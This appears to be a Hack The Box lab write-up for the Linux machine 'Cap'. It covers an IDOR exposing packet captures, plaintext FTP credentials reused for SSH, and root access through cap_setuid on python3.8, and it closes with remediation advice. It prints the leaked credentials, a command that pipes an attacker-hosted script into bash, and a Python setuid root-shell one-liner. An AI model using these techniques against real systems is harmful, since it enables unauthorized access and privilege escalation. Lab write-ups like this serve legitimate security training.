# HTB Writeup: Cap

**Difficulty:** Easy
**OS:** Linux (Ubuntu)
**Target IP:** 10.129.82.43
**Category:** IDOR, Credential Leakage, Linux Capabilities Privilege Escalation

---

## 1. Summary

Cap is an easy-difficulty Linux machine. The foothold relies on an **Insecure Direct Object Reference (IDOR)** vulnerability in a web-based "Security Dashboard" that exposes network packet captures (`.pcap` files) belonging to other users. One of these captures contains plaintext FTP credentials, which are reused for SSH access. Privilege escalation to root is achieved by abusing a **Linux capability** (`cap_setuid`) misconfigured on the `python3.8` binary.

---

## 2. Reconnaissance

### 2.1 Port Scanning

An initial Nmap scan was run against the target:

```bash
nmap -sV -sC 10.129.82.43
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 3.0.3 |
| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80/tcp | open | http | Gunicorn (title: "Security Dashboard") |

Three services are exposed: FTP, SSH, and a Python-based web application served through Gunicorn.

---

## 3. Web Enumeration & IDOR Vulnerability

Browsing to port 80 revealed a **Security Dashboard** web application. Among its features was a "Security Snapshot" option, which triggers the server to capture live network traffic and redirects the browser to a results page referenced by a numeric ID (e.g. `/data/<id>`).

Incrementing or decrementing this numeric ID allowed access to **other users' packet captures** — a classic **Insecure Direct Object Reference (IDOR)**, since the application does not verify that the requesting client is authorized to view the referenced capture.

By requesting the capture with **ID `0`** (often associated with the earliest / administrative capture), the corresponding `0.pcap` file was downloaded for offline analysis.

---

## 4. Foothold — Credential Leakage via PCAP

The downloaded `0.pcap` was opened in **Wireshark** for analysis.

Following the TCP stream of the FTP session revealed a full authentication exchange in plaintext:

```
Request: USER nathan
Response: 331 Please specify the password.
Request: PASS Buck3tH4TF0RM3!
Response: 230 Login successful.
```

Since FTP transmits credentials unencrypted, the username **`nathan`** and password **`Buck3tH4TF0RM3!`** were captured directly from the traffic.

### 4.1 Credential Reuse

These credentials were tested against the SSH service (port 22), a common misconfiguration where the same password is reused across multiple services:

```bash
ssh nathan@10.129.82.43
```

Access was granted, providing an initial shell as the user `nathan`.

---

## 5. User Flag

Listing the home directory confirmed the presence of the user flag:

```
nathan@cap:~$ ls -la
total 28
drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
drwxr-xr-x 3 root   root   4096 May 23  2021 ..
lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
drwx------ 2 nathan nathan 4096 May 23  2021 .cache
-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
-r-------- 1 nathan nathan   33 Jul 27 08:42 user.txt
```

Note the `.bash_history` and `.viminfo` files are symlinked to `/dev/null`, a common hardening measure to prevent command history retention — a minor obstacle for enumeration, but not relevant to the exploit path used here.

```bash
cat user.txt
```

---

## 6. Privilege Escalation Enumeration

With a foothold established, **LinPEAS** was transferred to the target and executed to enumerate privilege escalation vectors. A local HTTP server was hosted on the attacking machine (`10.10.17.226`) and the script pulled via `curl`:

```bash
curl http://10.10.17.226/linpeas.sh | bash
```

Attacker-side access log confirming the request:
```
10.129.82.43 - - [27/Jul/2026 02:17:34] "GET /linpeas.sh HTTP/1.1" 200 -
```

### 6.1 Key Finding: Linux Capabilities

Under the **"Files with capabilities"** section, LinPEAS flagged the following in red/orange (high severity):

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The critical entry is:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This means the **Python 3.8 interpreter binary itself** — not a specific script — has been granted the `cap_setuid` capability with the Effective, Inheritable, and Permitted flags set (`+eip`). Any process spawned from this interpreter can call `setuid()` and change its own UID to `0` (root), without needing the SUID bit or existing root privileges. This is a misconfiguration, likely introduced unintentionally (e.g., via `setcap cap_setuid+ep /usr/bin/python3.8`).

---

## 7. Exploitation — Root Shell

Using the `cap_setuid` capability, a root shell was obtained directly from the Python interpreter:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**How it works:**
1. `os.setuid(0)` — succeeds without a permission error because the `python3.8` binary carries the `cap_setuid` capability.
2. The Python process's effective UID becomes `0`.
3. `os.system("/bin/bash")` spawns a child shell that inherits the now-root UID.

This immediately dropped into a root shell (`root@cap:/#`).

---

## 8. Root Flag

```bash
root@cap:/# cat root/root.txt
```

The root flag was successfully retrieved, completing the machine.

---

## 9. Attack Chain Summary

```
Nmap scan (21/FTP, 22/SSH, 80/HTTP)
        │
        ▼
Web "Security Dashboard" → Security Snapshot feature
        │
        ▼
IDOR on numeric capture ID (/data/<id>) → download other users' .pcap files
        │
        ▼
Wireshark analysis of 0.pcap → plaintext FTP creds (nathan:Buck3tH4TF0RM3!)
        │
        ▼
Credential reuse → SSH login as nathan → user.txt
        │
        ▼
LinPEAS enumeration → cap_setuid on /usr/bin/python3.8
        │
        ▼
python3.8 -c 'os.setuid(0); os.system("/bin/bash")' → root shell → root.txt
```

---

## 10. Root Cause & Remediation

| Issue | Recommendation |
|-------|-----------------|
| IDOR on `/data/<id>` endpoint | Implement per-user access control / authorization checks; use non-sequential, unpredictable identifiers (e.g., UUIDs) for stored resources. |
| Plaintext FTP credentials | Replace FTP with an encrypted alternative (SFTP/FTPS); avoid transmitting credentials over unencrypted protocols. |
| Password reuse across services | Enforce unique credentials per service; consider key-based SSH authentication instead of passwords. |
| `cap_setuid` on `/usr/bin/python3.8` | Remove unnecessary capabilities from shared interpreters: `sudo setcap -r /usr/bin/python3.8`. Grant capabilities only to purpose-built binaries/scripts that strictly require them, never to a general-purpose interpreter. |

---

## 11. Lessons Learned

- Numeric IDs in URLs are a strong signal to test for IDOR.
- Packet captures containing legacy or unencrypted protocols (FTP, Telnet, HTTP) are a valuable source of leaked credentials during forensic analysis.
- Linux capabilities are a more granular alternative to SUID, but misapplying them to general-purpose binaries (like a language interpreter) can be just as dangerous as an unsafe SUID bit — `getcap -r / 2>/dev/null` should be a standard step in any privilege escalation enumeration.
